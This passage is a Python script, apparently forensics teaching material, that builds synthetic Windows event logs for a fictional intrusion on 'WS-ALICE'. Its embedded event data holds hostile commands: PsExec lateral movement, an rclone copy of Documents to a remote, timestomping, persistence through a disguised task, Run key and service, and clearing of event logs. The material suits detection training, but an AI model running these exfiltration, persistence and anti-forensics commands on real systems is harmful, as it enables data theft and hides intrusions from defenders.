#!/usr/bin/env python3
"""mk_event_logs.py - write the Day 14 Windows event logs (.evtx) for WS-ALICE.

Usage: python3 mk_event_logs.py OUTDIR

Writes six logs (byte-identical on every run, standard library only) under
OUTDIR/Windows/System32/winevt/Logs/:
  Security.evtx                                      logons, failed logons, special privileges,
                                                     process creation, scheduled task created
  System.evtx                                        boots and shutdowns, services installed and
                                                     started, a log cleared
  Microsoft-Windows-PowerShell%4Operational.evtx     script block logging (4104)
  Microsoft-Windows-TaskScheduler%4Operational.evtx  task registered (106)
  Microsoft-Windows-Partition%4Diagnostic.evtx       USB disk connected/removed (1006, with its VBR)
  Microsoft-Windows-Kernel-PnP%4Configuration.evtx   a new device configured (400)

The files use the real EVTX layout: a file header, 64 KB chunks with string and template tables
and CRC32 checksums, and records whose binary XML is a template instance. As Windows does, one
System template per provider is defined once per chunk and reused, and each event's EventData
(or UserData) is a nested binary XML value with its own template. Field names, providers, task
and keyword values follow real events (EvtxECmd's map examples and public sample logs).
The story continues Days 9-13 (same times, users, services, share and USB drive). Synthetic
teaching data: checked with evtx_dump (omerbenamram/evtx), EvtxECmd, libevtx and python-evtx.
"""
import os
import struct
import sys
import uuid
import zlib

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mk_reg_hives import ft  # noqa: E402

COMPUTER = "WS-ALICE"
SID_ALICE = "S-1-5-21-3623811015-3361044348-30300820-1001"
SID_BOB = "S-1-5-21-3623811015-3361044348-30300820-1002"
NS = uuid.UUID("6f1c0c43-4c1f-4b55-9c50-9a1f0d7e2a14")      # for deterministic template GUIDs

# value types (libevtx / MS-EVEN6)
NULL, STRING, UINT8, UINT16, INT32, UINT32, UINT64, BOOL, BINARY, GUID, FILETIME, SID, HEX32, HEX64, BINXML = (
    0x00, 0x01, 0x04, 0x06, 0x07, 0x08, 0x0A, 0x0D, 0x0E, 0x0F, 0x11, 0x13, 0x14, 0x15, 0x21)


# ---------------------------------------------------------------- values

def sid_bytes(sid):
    parts = sid.split("-")
    auth, subs = int(parts[2]), [int(x) for x in parts[3:]]
    return struct.pack("<BB", 1, len(subs)) + auth.to_bytes(6, "big") + b"".join(struct.pack("<I", s) for s in subs)


def encode(vtype, value):
    if value is None:
        return NULL, b""
    if vtype == STRING:
        return vtype, value.encode("utf-16-le")
    if vtype == UINT8:
        return vtype, struct.pack("<B", value)
    if vtype == UINT16:
        return vtype, struct.pack("<H", value)
    if vtype in (UINT32, HEX32):
        return vtype, struct.pack("<I", value)
    if vtype == INT32:
        return vtype, struct.pack("<i", value)
    if vtype in (UINT64, HEX64):
        return vtype, struct.pack("<Q", value)
    if vtype == BOOL:
        return vtype, struct.pack("<I", 1 if value else 0)
    if vtype == FILETIME:
        return vtype, struct.pack("<Q", ft(value))
    if vtype == GUID:
        return vtype, uuid.UUID(value).bytes_le
    if vtype == SID:
        return vtype, sid_bytes(value)
    if vtype == BINARY:
        return vtype, bytes(value)
    raise ValueError(vtype)


# ---------------------------------------------------------------- template trees
# An element is (name, attributes, content). Attributes: [(name, value)]. Content: a list of
# elements and values. A value is a literal str or Sub(index, type).

class Sub:
    def __init__(self, index, vtype, optional=True):
        self.index, self.vtype, self.optional = index, vtype, optional


def E(name, attrs=(), content=()):
    return (name, list(attrs), list(content))


def name_hash(name):
    h = 0
    for unit in struct.unpack(f"<{len(name)}H", name.encode("utf-16-le")):
        h = (h * 65599 + unit) & 0xFFFFFFFF
    return h & 0xFFFF


class Chunk:
    SIZE = 65536

    def __init__(self):
        self.buf = bytearray(self.SIZE)
        self.pos = 512
        self.names = {}
        self.strings = [0] * 64
        self.templates = {}
        self.template_table = [0] * 32
        self.records = []           # (record id, offset)


class Out:
    """Appends bytes at a known chunk offset, so names and templates can be defined inline."""

    def __init__(self, chunk, start):
        self.chunk, self.start, self.b = chunk, start, bytearray()

    def here(self):
        return self.start + len(self.b)

    def u8(self, v):
        self.b += struct.pack("<B", v)

    def u16(self, v):
        self.b += struct.pack("<H", v)

    def u32(self, v):
        self.b += struct.pack("<I", v)

    def placeholder(self):
        at = len(self.b)
        self.u32(0)
        return at

    def patch(self, at, value):
        struct.pack_into("<I", self.b, at, value)

    def name(self, n):
        c = self.chunk
        if n in c.names:
            self.u32(c.names[n])
            return
        off = self.here() + 4
        self.u32(off)
        h = name_hash(n)
        bucket = h % 64
        self.u32(c.strings[bucket])                 # next string in this hash bucket
        self.u16(h)
        self.u16(len(n))
        self.b += n.encode("utf-16-le") + b"\0\0"
        c.names[n] = off
        c.strings[bucket] = off

    def text(self, s):
        self.u8(0x05)
        self.u8(STRING)
        self.u16(len(s))
        self.b += s.encode("utf-16-le")

    def value(self, v):
        if isinstance(v, Sub):
            self.u8(0x0E if v.optional else 0x0D)
            self.u16(v.index)
            self.u8(v.vtype)
        else:
            self.text(v)

    def element(self, el):
        name, attrs, content = el
        self.u8(0x41 if attrs else 0x01)
        only = content[0] if len(content) == 1 and isinstance(content[0], Sub) else None
        self.u16(only.index if only else 0xFFFF)          # dependency identifier
        size_at = self.placeholder()
        self.name(name)
        if attrs:
            list_at = self.placeholder()
            list_start = len(self.b)
            for k, (aname, aval) in enumerate(attrs):
                self.u8(0x46 if k < len(attrs) - 1 else 0x06)
                self.name(aname)
                self.value(aval)
            self.patch(list_at, len(self.b) - list_start)
        if content:
            self.u8(0x02)
            for item in content:
                if isinstance(item, tuple):
                    self.element(item)
                else:
                    self.value(item)
            self.u8(0x04)
        else:
            self.u8(0x03)
        self.patch(size_at, len(self.b) - (size_at + 4))

    def template_instance(self, key, tree, values):
        """Template instance: define the template here on first use in this chunk, then the values.
        values: [(type, python value)]; a BINXML value is a callable that writes nested binary XML."""
        c = self.chunk
        guid = uuid.uuid5(NS, key)
        tid = struct.unpack("<I", guid.bytes_le[:4])[0]
        self.u8(0x0C)
        self.u8(0x01)
        self.u32(tid)
        if key in c.templates:
            self.u32(c.templates[key])
        else:
            off = self.here() + 4
            self.u32(off)
            bucket = tid % 32
            self.u32(c.template_table[bucket])          # next template in this bucket
            self.b += guid.bytes_le
            size_at = self.placeholder()
            body = len(self.b)
            self.b += b"\x0f\x01\x01\x00"
            self.element(tree)
            self.u8(0x00)
            self.patch(size_at, len(self.b) - body)
            c.templates[key] = off
            c.template_table[bucket] = off
        self.u32(len(values))
        desc_at = len(self.b)
        self.b += b"\0" * (4 * len(values))
        for k, (vtype, v) in enumerate(values):
            start = len(self.b)
            if vtype == BINXML:
                v(self)
                t = BINXML
            else:
                t, raw = encode(vtype, v)
                self.b += raw
            struct.pack_into("<HBB", self.b, desc_at + 4 * k, len(self.b) - start, t, 0)


# ---------------------------------------------------------------- events

PROVIDERS = {   # name -> (GUID or None, EventSourceName, channel)
    "Microsoft-Windows-Security-Auditing": ("{54849625-5478-4994-a5ba-3e3b0328c30d}", None, "Security"),
    "Service Control Manager": ("{555908d1-a6d7-4695-8e1e-26931d2012f4}", "Service Control Manager", "System"),
    "EventLog": (None, None, "System"),
    "User32": ("{b0aa8734-56f7-41cc-b2f4-de628e98b946}", "User32", "System"),
    "Microsoft-Windows-Kernel-General": ("{a68ca8b7-004f-d7b6-a698-07e2de0f1f5d}", None, "System"),
    "Microsoft-Windows-Eventlog": ("{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}", None, "System"),
    "Microsoft-Windows-PowerShell": ("{a0c1253b-5c40-4b15-8766-3cabc58f985a}", None,
                                     "Microsoft-Windows-PowerShell/Operational"),
    "Microsoft-Windows-TaskScheduler": ("{de7b24ea-73c8-4a09-985d-5bdadcfa9017}", None,
                                        "Microsoft-Windows-TaskScheduler/Operational"),
    "Microsoft-Windows-Partition": ("{412bdff2-a8c4-470d-8f33-63fe0d8c20e2}", None,
                                    "Microsoft-Windows-Partition/Diagnostic"),
    "Microsoft-Windows-Kernel-PnP": ("{9c679a39-1250-487d-abd7-e831c6290539}", None,
                                     "Microsoft-Windows-Kernel-PnP/Configuration"),
}


def system_template(provider):
    """The System template, laid out like Windows 10/11's (substitutions 0-18, event data in 19)."""
    guid, source, channel = PROVIDERS[provider]
    pattrs = [("Name", provider)] + ([("Guid", guid)] if guid else []) + ([("EventSourceName", source)] if source else [])
    system = E("System", content=[
        E("Provider", pattrs),
        E("EventID", [("Qualifiers", Sub(4, UINT16))], [Sub(3, UINT16)]),
        E("Version", content=[Sub(11, UINT8)]),
        E("Level", content=[Sub(0, UINT8)]),
        E("Task", content=[Sub(2, UINT16)]),
        E("Opcode", content=[Sub(1, UINT8)]),
        E("Keywords", content=[Sub(5, HEX64)]),
        E("TimeCreated", [("SystemTime", Sub(6, FILETIME))]),
        E("EventRecordID", content=[Sub(10, UINT64)]),
        E("Correlation", [("ActivityID", Sub(7, GUID)), ("RelatedActivityID", Sub(18, GUID))]),
        E("Execution", [("ProcessID", Sub(8, UINT32)), ("ThreadID", Sub(9, UINT32))]),
        E("Channel", content=[channel]),
        E("Computer", content=[COMPUTER]),
        E("Security", [("UserID", Sub(12, SID))]),
    ])
    return E("Event", [("xmlns", "http://schemas.microsoft.com/win/2004/08/events/event")], [system, Sub(19, BINXML)])


class Event:
    def __init__(self, when, provider, eid, fields, *, version=0, level=4, task=0, opcode=0, keywords=0,
                 qualifiers=None, pid=0, tid=0, user=None, activity=None, user_data=None, data_attr=None):
        self.when, self.provider, self.eid, self.fields = when, provider, eid, fields
        self.version, self.level, self.task, self.opcode, self.keywords = version, level, task, opcode, keywords
        self.qualifiers, self.pid, self.tid, self.user, self.activity = qualifiers, pid, tid, user, activity
        self.user_data, self.data_attr = user_data, data_attr

    def data_tree(self):
        """EventData with <Data Name=...> elements, or UserData/<element xmlns=...> with child elements."""
        if self.user_data:
            tag, xmlns = self.user_data
            inner = E(tag, [("xmlns", xmlns)], [E(n, content=[Sub(k, t)]) for k, (n, t, _) in enumerate(self.fields)])
            return E("UserData", content=[inner])
        items = []
        for k, (n, t, _) in enumerate(self.fields):
            items.append(E(n, content=[Sub(k, t)]) if n == "Binary" else E("Data", [("Name", n)], [Sub(k, t)]))
        return E("EventData", [("Name", self.data_attr)] if self.data_attr else [], items)

    def write(self, out, record_id):
        def nested(o):
            o.b += b"\x0f\x01\x01\x00"
            key = f"{self.provider}/{self.eid}/{self.version}/data"
            o.template_instance(key, self.data_tree(), [(t, v) for _, t, v in self.fields])
            o.u8(0x00)

        values = [(UINT8, self.level), (UINT8, self.opcode), (UINT16, self.task), (UINT16, self.eid),
                  (UINT16, self.qualifiers), (HEX64, self.keywords), (FILETIME, self.when), (GUID, self.activity),
                  (UINT32, self.pid), (UINT32, self.tid), (UINT64, record_id), (UINT8, self.version),
                  (SID, self.user), (NULL, None), (NULL, None), (NULL, None), (NULL, None), (NULL, None),
                  (NULL, None), (BINXML, nested)]
        out.b += b"\x0f\x01\x01\x00"
        out.template_instance(f"{self.provider}/system", system_template(self.provider), values)
        out.u8(0x00)


def record_bytes(chunk, ev, record_id):
    out = Out(chunk, chunk.pos + 24)
    ev.write(out, record_id)
    size = 24 + len(out.b) + 4
    pad = (-size) % 8
    return struct.pack("<IIQQ", 0x00002A2A, size + pad, record_id, ft(ev.when)) + bytes(out.b) + b"\0" * pad + \
        struct.pack("<I", size + pad)


def write_evtx(path, events, first_id):
    chunks, chunk = [], Chunk()
    rid = first_id
    for ev in sorted(events, key=lambda e: e.when):
        snapshot = (dict(chunk.names), list(chunk.strings), dict(chunk.templates), list(chunk.template_table))
        rec = record_bytes(chunk, ev, rid)
        if chunk.pos + len(rec) > Chunk.SIZE:
            chunk.names, chunk.strings, chunk.templates, chunk.template_table = snapshot
            chunks.append(chunk)
            chunk = Chunk()
            rec = record_bytes(chunk, ev, rid)
        chunk.buf[chunk.pos:chunk.pos + len(rec)] = rec
        chunk.records.append((rid, chunk.pos))
        chunk.pos += len(rec)
        rid += 1
    chunks.append(chunk)
    out = bytearray(4096)
    for c in chunks:
        first, last = c.records[0][0], c.records[-1][0]
        struct.pack_into("<8sQQQQIII", c.buf, 0, b"ElfChnk\0", first, last, first, last, 128, c.records[-1][1], c.pos)
        for i, v in enumerate(c.strings):
            struct.pack_into("<I", c.buf, 128 + 4 * i, v)
        for i, v in enumerate(c.template_table):
            struct.pack_into("<I", c.buf, 384 + 4 * i, v)
        struct.pack_into("<I", c.buf, 52, zlib.crc32(c.buf[512:c.pos]) & 0xFFFFFFFF)
        struct.pack_into("<I", c.buf, 124, zlib.crc32(c.buf[:120] + c.buf[128:512]) & 0xFFFFFFFF)
        out += c.buf
    struct.pack_into("<8sQQQIHHHH", out, 0, b"ElfFile\0", 0, len(chunks) - 1, rid, 128, 2, 3, 4096, len(chunks))
    struct.pack_into("<I", out, 124, zlib.crc32(out[:120]) & 0xFFFFFFFF)
    with open(path, "wb") as f:
        f.write(out)


# ---------------------------------------------------------------- WS-ALICE, 2026-09-28 / 29 (UTC)

SEC = "Microsoft-Windows-Security-Auditing"
SYSTEM_ACCT = ("S-1-5-18", "WS-ALICE$", "WORKGROUP", 0x3E7)
ALICE_0928 = (SID_ALICE, "alice", "WS-ALICE", 0x2A4F1)
ALICE = (SID_ALICE, "alice", "WS-ALICE", 0x3A1F2)
BOB = (SID_BOB, "bob", "WS-ALICE", 0x5C1D2E)
NOBODY = ("S-1-0-0", "-", "-", 0x0)
ADMIN_PRIVS = "\r\n\t\t\t".join(["SeSecurityPrivilege", "SeTakeOwnershipPrivilege", "SeLoadDriverPrivilege",
                                 "SeBackupPrivilege", "SeRestorePrivilege", "SeDebugPrivilege",
                                 "SeSystemEnvironmentPrivilege", "SeImpersonatePrivilege",
                                 "SeDelegateSessionUserImpersonatePrivilege"])
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
RC = r"C:\Users\alice\AppData\Local\Temp\rc"
SYNC_CMD = rf"{RC}\rclone.exe copy C:\Users\alice\Documents remote:drop"
TASK_XML = (
    '<?xml version="1.0" encoding="UTF-16"?>\r\n'
    '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\r\n'
    '  <RegistrationInfo>\r\n    <Author>WS-ALICE\\alice</Author>\r\n    <URI>\\OneDriveUpdate</URI>\r\n'
    '  </RegistrationInfo>\r\n  <Triggers>\r\n    <LogonTrigger>\r\n      <Enabled>true</Enabled>\r\n'
    '    </LogonTrigger>\r\n  </Triggers>\r\n  <Actions Context="Author">\r\n    <Exec>\r\n'
    f'      <Command>{RC}\\rclone.exe</Command>\r\n'
    f'      <Arguments>copy C:\\Users\\alice\\Documents remote:drop --config {RC}\\rc.conf</Arguments>\r\n'
    '    </Exec>\r\n  </Actions>\r\n</Task>')


def subject(acct):
    sid, name, dom, lid = acct
    return [("SubjectUserSid", SID, sid), ("SubjectUserName", STRING, name), ("SubjectDomainName", STRING, dom),
            ("SubjectLogonId", HEX64, lid)]


def logon(when, acct, ltype, *, ip="-", port="-", workstation="-", process=(0, "-"), tid=0):
    sid, name, dom, lid = acct
    net = ltype == 3
    fields = subject(NOBODY if net else SYSTEM_ACCT) + [
        ("TargetUserSid", SID, sid), ("TargetUserName", STRING, name), ("TargetDomainName", STRING, dom),
        ("TargetLogonId", HEX64, lid), ("LogonType", UINT32, ltype),
        ("LogonProcessName", STRING, "NtLmSsp " if net else "User32 "),
        ("AuthenticationPackageName", STRING, "NTLM" if net else "Negotiate"),
        ("WorkstationName", STRING, workstation), ("LogonGuid", GUID, "00000000-0000-0000-0000-000000000000"),
        ("TransmittedServices", STRING, "-"), ("LmPackageName", STRING, "NTLM V2" if net else "-"),
        ("KeyLength", UINT32, 128 if net else 0), ("ProcessId", HEX64, process[0]), ("ProcessName", STRING, process[1]),
        ("IpAddress", STRING, ip), ("IpPort", STRING, port), ("ImpersonationLevel", STRING, "%%1833"),
        ("RestrictedAdminMode", STRING, "-"), ("TargetOutboundUserName", STRING, "-"),
        ("TargetOutboundDomainName", STRING, "-"), ("VirtualAccount", STRING, "%%1843"),
        ("TargetLinkedLogonId", HEX64, 0), ("ElevatedToken", STRING, "%%1842")]
    return Event(when, SEC, 4624, fields, version=2, level=0, task=12544, keywords=0x8020000000000000,
                 pid=716, tid=tid)


def failed(when, user, status, sub, reason, tid, port):
    fields = subject(NOBODY) + [
        ("TargetUserSid", SID, "S-1-0-0"), ("TargetUserName", STRING, user), ("TargetDomainName", STRING, "WS-ALICE"),
        ("Status", HEX32, status), ("FailureReason", STRING, reason), ("SubStatus", HEX32, sub),
        ("LogonType", UINT32, 3), ("LogonProcessName", STRING, "NtLmSsp "), ("AuthenticationPackageName", STRING, "NTLM"),
        ("WorkstationName", STRING, "LAPTOP-7Q2K"), ("TransmittedServices", STRING, "-"), ("LmPackageName", STRING, "-"),
        ("KeyLength", UINT32, 0), ("ProcessId", HEX64, 0), ("ProcessName", STRING, "-"),
        ("IpAddress", STRING, "10.20.30.45"), ("IpPort", STRING, port)]
    return Event(when, SEC, 4625, fields, level=0, task=12544, keywords=0x8010000000000000, pid=716, tid=tid)


def privileges(when, acct, tid):
    return Event(when, SEC, 4672, subject(acct) + [("PrivilegeList", STRING, ADMIN_PRIVS)], level=0, task=12548,
                 keywords=0x8020000000000000, pid=716, tid=tid)


def logoff(when, acct, ltype, eid=4634):
    sid, name, dom, lid = acct
    fields = [("TargetUserSid", SID, sid), ("TargetUserName", STRING, name), ("TargetDomainName", STRING, dom),
              ("TargetLogonId", HEX64, lid)] + ([("LogonType", UINT32, ltype)] if eid == 4634 else [])
    return Event(when, SEC, eid, fields, level=0, task=12545 if eid == 4634 else 12544,
                 keywords=0x8020000000000000, pid=716, tid=1880)


def process(when, creator, pid, image, cmdline, ppid, parent, *, target=NOBODY, elevation="%%1937",
            label="S-1-16-12288"):
    fields = subject(creator) + [
        ("NewProcessId", HEX64, pid), ("NewProcessName", STRING, image), ("TokenElevationType", STRING, elevation),
        ("ProcessId", HEX64, ppid), ("CommandLine", STRING, cmdline), ("TargetUserSid", SID, target[0]),
        ("TargetUserName", STRING, target[1]), ("TargetDomainName", STRING, target[2]),
        ("TargetLogonId", HEX64, target[3]), ("ParentProcessName", STRING, parent), ("MandatoryLabel", SID, label)]
    return Event(when, SEC, 4688, fields, version=2, level=0, task=13312, keywords=0x8020000000000000,
                 pid=4, tid=pid % 997 + 100)


def security_log():
    explorer28, explorer29, ps_hidden = 0x1394, 0x15C8, 0x2F14
    return [
        logon("2026-09-28 07:59:05.3311042", ALICE_0928, 2, ip="127.0.0.1", port="0", workstation="WS-ALICE",
              process=(0x3D4, r"C:\Windows\System32\svchost.exe"), tid=1120),
        privileges("2026-09-28 07:59:05.3311187", ALICE_0928, 1120),
        process("2026-09-28 10:13:41.2093312", ALICE_0928, 0x1E88, PS, f'"{PS}" ', explorer28,
                r"C:\Windows\explorer.exe"),
        logoff("2026-09-28 18:02:38.0127743", ALICE_0928, 2, eid=4647),
        logon("2026-09-29 00:58:41.7702214", ALICE, 2, ip="127.0.0.1", port="0", workstation="WS-ALICE",
              process=(0x3C0, r"C:\Windows\System32\svchost.exe"), tid=1104),
        privileges("2026-09-29 00:58:41.7702390", ALICE, 1104),
        failed("2026-09-29 01:04:10.2214519", "administrator", 0xC000006E, 0xC0000072, "%%2310", 2311, "49781"),
        failed("2026-09-29 01:04:14.8830265", "admin", 0xC000006D, 0xC0000064, "%%2313", 2311, "49784"),
        failed("2026-09-29 01:04:19.3372080", "bob", 0xC000006D, 0xC000006A, "%%2313", 2311, "49790"),
        logon("2026-09-29 01:05:11.4421907", BOB, 3, ip="10.20.30.45", port="49822", workstation="LAPTOP-7Q2K",
              tid=2311),
        privileges("2026-09-29 01:05:11.4422050", BOB, 2311),
        process("2026-09-29 01:05:12.6150473", SYSTEM_ACCT, 0x1B7C, r"C:\Windows\PSEXESVC.exe",
                r"C:\Windows\PSEXESVC.exe", 0x2A8, r"C:\Windows\System32\services.exe",
                elevation="%%1936", label="S-1-16-16384"),
        process("2026-09-29 01:05:14.0026617", SYSTEM_ACCT, 0x2368, r"C:\Windows\System32\cmd.exe", '"cmd"',
                0x1B7C, r"C:\Windows\PSEXESVC.exe", target=BOB, elevation="%%1936"),
        process("2026-09-29 01:05:20.4410958", BOB, 0x0E50, r"C:\Windows\System32\whoami.exe", "whoami  /all",
                0x2368, r"C:\Windows\System32\cmd.exe", elevation="%%1936"),
        process("2026-09-29 01:05:44.9073381", BOB, 0x2D30, r"C:\Windows\System32\net.exe",
                "net  localgroup administrators", 0x2368, r"C:\Windows\System32\cmd.exe", elevation="%%1936"),
        logoff("2026-09-29 01:08:41.0059926", BOB, 3),
        process("2026-09-29 01:09:31.5120044", ALICE, ps_hidden, PS, '"powershell.exe" -w hidden -nop', explorer29,
                r"C:\Windows\explorer.exe"),
        process("2026-09-29 01:12:47.6629015", ALICE, 0x2B60, rf"{RC}\rclone.exe",
                rf'"{RC}\rclone.exe" copy C:\Users\alice\Documents remote:drop --config {RC}\rc.conf', ps_hidden, PS),
        process("2026-09-29 01:21:05.1180032", ALICE, 0x2C8C, r"C:\Windows\System32\schtasks.exe",
                rf'"C:\Windows\system32\schtasks.exe" /create /tn OneDriveUpdate /xml {RC}\task.xml', ps_hidden, PS),
        Event("2026-09-29 01:21:05.4402217", SEC, 4698, subject(ALICE) + [
            ("TaskName", STRING, "\\OneDriveUpdate"), ("TaskContent", STRING, TASK_XML)],
            level=0, task=12804, keywords=0x8020000000000000, pid=716, tid=2290),
        process("2026-09-29 01:22:10.4991862", ALICE, 0x1F50, r"C:\Windows\System32\sc.exe",
                f'"C:\\Windows\\system32\\sc.exe" create OneDriveSync binPath= "{SYNC_CMD}" start= auto '
                'DisplayName= "OneDrive Sync Helper"', ps_hidden, PS),
        process("2026-09-29 01:22:11.0213549", ALICE, 0x2470, r"C:\Windows\System32\sc.exe",
                '"C:\\Windows\\system32\\sc.exe" start OneDriveSync', ps_hidden, PS),
        logoff("2026-09-29 07:54:57.6618805", ALICE, 2, eid=4647),
    ]


def scm(when, eid, fields, user=None, tid=0):
    return Event(when, "Service Control Manager", eid, fields, level=4, qualifiers=16384,
                 keywords=0x8080000000000000, pid=680, tid=tid, user=user)


def installed(when, name, image, start, user):
    return scm(when, 7045, [("ServiceName", STRING, name), ("ImagePath", STRING, image),
                            ("ServiceType", STRING, "user mode service"), ("StartType", STRING, start),
                            ("AccountName", STRING, "LocalSystem")], user=user, tid=3012)


def state(when, name, running):
    code = "4" if running else "1"
    return scm(when, 7036, [("param1", STRING, name), ("param2", STRING, "running" if running else "stopped"),
                            ("Binary", BINARY, f"{name.upper()}/{code}\0".encode("utf-16-le"))], tid=3140)


def boot(started, logged):
    return [
        Event(logged[0], "Microsoft-Windows-Kernel-General", 12, [
            ("MajorVersion", UINT32, 10), ("MinorVersion", UINT32, 0), ("BuildVersion", UINT32, 26100),
            ("QfeVersion", UINT32, 4652), ("ServiceVersion", UINT32, 0), ("BootMode", UINT32, 0),
            ("StartTime", FILETIME, started)], task=1, keywords=0x8000000000000080, pid=4, tid=8, user="S-1-5-18"),
        Event(logged[1], "EventLog", 6005, [("Binary", BINARY, bytes(24))], qualifiers=32768,
              keywords=0x80000000000000)]


def shutdown(when_1074, how, when_6006, stopped):
    return [
        Event(when_1074, "User32", 1074, [
            ("param1", STRING, "C:\\Windows\\Explorer.EXE (WS-ALICE)"), ("param2", STRING, "WS-ALICE"),
            ("param3", STRING, "Other (Unplanned)"), ("param4", STRING, "0x0"), ("param5", STRING, how),
            ("param6", STRING, ""), ("param7", STRING, "WS-ALICE\\alice")],
            qualifiers=32768, keywords=0x8080000000000000, pid=1312, tid=4424, user=SID_ALICE),
        Event(when_6006, "EventLog", 6006, [("Binary", BINARY, bytes(8))], qualifiers=32768,
              keywords=0x80000000000000),
        Event(stopped, "Microsoft-Windows-Kernel-General", 13, [("StopTime", FILETIME, stopped)],
              task=2, keywords=0x8000000000000080, pid=4, tid=6060)]


def system_log():
    return (boot("2026-09-28 07:58:11.5410000", ("2026-09-28 07:58:12.0204466", "2026-09-28 07:58:24.8851201"))
            + shutdown("2026-09-28 18:02:39.2207731", "power off", "2026-09-28 18:02:44.1180944",
                       "2026-09-28 18:02:44.6620193")
            + boot("2026-09-29 00:57:01.4320000", ("2026-09-29 00:57:01.9907312", "2026-09-29 00:57:13.9410028"))
            + [installed("2026-09-29 01:05:12.0731180", "PSEXESVC", r"%SystemRoot%\PSEXESVC.exe", "demand start",
                         SID_BOB),
               state("2026-09-29 01:05:12.6033871", "PSEXESVC", True),
               state("2026-09-29 01:08:40.2241136", "PSEXESVC", False),
               installed("2026-09-29 01:22:10.5550001", "OneDriveSync", SYNC_CMD, "auto start", SID_ALICE),
               state("2026-09-29 01:22:11.2017745", "OneDrive Sync Helper", True),
               Event("2026-09-29 01:38:12.3305510", "Microsoft-Windows-Eventlog", 104, [
                   ("SubjectUserName", STRING, "alice"), ("SubjectDomainName", STRING, "WS-ALICE"),
                   ("Channel", STRING, "Windows PowerShell"), ("BackupPath", STRING, "")],
                   task=104, keywords=0x8000000000000000, pid=1468, tid=5512, user=SID_ALICE,
                   user_data=("LogFileCleared", "http://manifests.microsoft.com/win/2004/08/windows/eventlog"))]
            + shutdown("2026-09-29 07:54:58.9120365", "restart", "2026-09-29 07:55:02.2307468",
                       "2026-09-29 07:55:02.7710042")
            + boot("2026-09-29 07:58:18.5060000", ("2026-09-29 07:58:18.9902231", "2026-09-29 07:58:20.4113870"))
            + [state("2026-09-29 07:58:21.3006127", "OneDrive Sync Helper", True)])


SCRIPTS = [   # (time, PowerShell process ID, script block text)
    ("2026-09-28 10:13:44.7123301", 0x1E88,
     "Invoke-WebRequest https://downloads.example.net/rc.zip -OutFile $env:TEMP\\rc.zip"),
    ("2026-09-28 10:14:21.9310457", 0x1E88, "Expand-Archive $env:TEMP\\rc.zip -DestinationPath $env:TEMP\\rc"),
    ("2026-09-29 01:12:46.9921034", 0x2F14,
     "& $env:TEMP\\rc\\rclone.exe copy C:\\Users\\alice\\Documents remote:drop --config $env:TEMP\\rc\\rc.conf"),
    ("2026-09-29 01:20:44.6208813", 0x2F14,
     "$p = Get-Item \"$env:USERPROFILE\\Downloads\\payload.ps1\"\r\n"
     "$p.LastWriteTimeUtc = $p.LastAccessTimeUtc = '2019-03-14 10:00:00'\r\n"
     "$s = Get-Item \"$env:TEMP\\svchost.tmp\"\r\n"
     "$s.CreationTimeUtc = $s.LastWriteTimeUtc = $s.LastAccessTimeUtc = '2019-03-14 10:00:00'\r\n"
     "Rename-Item $s.FullName svchost.exe"),
    ("2026-09-29 01:21:04.3027765", 0x2F14, "schtasks /create /tn OneDriveUpdate /xml $env:TEMP\\rc\\task.xml"),
    ("2026-09-29 01:21:29.8874103", 0x2F14,
     "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name OneDriveUpdate -Value "
     f"'{SYNC_CMD}'"),
    ("2026-09-29 01:22:09.8803316", 0x2F14,
     f"sc.exe create OneDriveSync binPath= \"{SYNC_CMD}\" start= auto DisplayName= \"OneDrive Sync Helper\"\r\n"
     "sc.exe start OneDriveSync"),
    ("2026-09-29 01:38:11.5506221", 0x2F14, "Clear-EventLog -LogName 'Windows PowerShell'"),
]


def powershell_log():
    out = []
    for k, (when, pid, text) in enumerate(SCRIPTS):
        sbid = str(uuid.uuid5(NS, f"scriptblock{k}"))
        out.append(Event(when, "Microsoft-Windows-PowerShell", 4104, [
            ("MessageNumber", INT32, 1), ("MessageTotal", INT32, 1), ("ScriptBlockText", STRING, text),
            ("ScriptBlockId", STRING, sbid), ("Path", STRING, "")],
            version=1, level=5, task=2, opcode=15, keywords=0, pid=pid, tid=pid % 991 + 200, user=SID_ALICE,
            activity=str(uuid.uuid5(NS, f"activity{pid}"))))
    return out


USB_SERIAL = "E0D55EA574F5E7A1C9A2016B"
USB_PARENT = f"USB\\VID_0951&PID_1666\\{USB_SERIAL}"
USB_SECTORS = 60604416                                    # 31,029,460,992 bytes


def mbr():
    m = bytearray(512)
    struct.pack_into("<I", m, 0x1B8, 0x6E2A1D4C)          # disk signature
    struct.pack_into("<B3sB3sII", m, 0x1BE, 0x00, b"\x20\x21\x00", 0x07, b"\xFE\xFF\xFF", 2048, USB_SECTORS - 2048)
    m[510:512] = b"\x55\xAA"
    return bytes(m)


def ntfs_vbr():
    v = bytearray(512)
    v[0:11] = b"\xEB\x52\x90NTFS    "
    struct.pack_into("<HBH", v, 0x0B, 512, 8, 0)           # bytes/sector, sectors/cluster, reserved
    v[0x15] = 0xF8
    struct.pack_into("<HHI", v, 0x18, 63, 255, 2048)       # sectors/track, heads, hidden sectors
    struct.pack_into("<QQQ", v, 0x28, USB_SECTORS - 2049, 786432, 2)   # total sectors, $MFT, $MFTMirr clusters
    struct.pack_into("<bxxxbxxx", v, 0x40, -10, 1)         # 1,024-byte FILE records, 1 cluster per index block
    struct.pack_into("<Q", v, 0x48, 0x4A3B1C0D5E1D7A2C)    # volume serial number (Windows shows 5E1D-7A2C)
    v[510:512] = b"\x55\xAA"
    return bytes(v)


def partition_event(when, connected):
    on = connected
    g = lambda s: str(uuid.uuid5(NS, s))  # noqa: E731
    fields = [
        ("DiskNumber", UINT32, 1), ("Flags", UINT32, 8208 if on else 0), ("Characteristics", UINT32, 1 if on else 0),
        ("IsSystemCritical", BOOL, False), ("PagingCount", UINT32, 0), ("HibernationCount", UINT32, 0),
        ("DumpCount", UINT32, 0), ("BytesPerSector", UINT32, 512 if on else 0),
        ("Capacity", UINT64, USB_SECTORS * 512 if on else 0), ("BusType", UINT32, 7 if on else 0),
        ("Manufacturer", STRING, "Kingston" if on else ""), ("Model", STRING, "DataTraveler 3.0" if on else ""),
        ("Revision", STRING, "PMAP" if on else ""), ("SerialNumber", STRING, USB_SERIAL if on else ""),
